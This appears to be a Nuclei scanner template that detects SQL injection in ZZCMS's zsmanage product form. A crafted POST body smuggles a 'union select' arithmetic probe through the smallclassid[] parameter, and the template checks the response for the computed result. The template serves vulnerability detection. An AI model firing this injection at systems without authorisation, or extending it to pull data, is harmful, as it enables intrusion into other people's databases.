id: zzcms-zsmanage-sqli

info:
  name: ZZCMS ZSManageSQLI
  author: ritikchaddha
  severity: high
  reference:
    - https://github.com/JcQSteven/blog/issues/18
  tags: zzcms,sqli,zsmanage

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        proname=abcdef&tz=1%E4%B8%87%E4%BB%A5%E4%B8%8B&prouse=abcdef&sx%5B%5D=&sx%5B%5D=&sm=abcdef&province=%E5%85%A8%E5%9B%BD&city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&xiancheng=&cityforadd=&img=%2Fimage%2Fnopic.gif&flv=&zc=&yq=&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF&smallclassid[]=1&smallclassid[]=2)%20union%20select%2054637*83928%23

  - method: GET
    path:
      - "{{BaseURL}}/user/zsmanage.php"

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:

      - type: word
        part: body
        words:
          - "4585574136"

      - type: status
        status:
          - 200
        condition: and
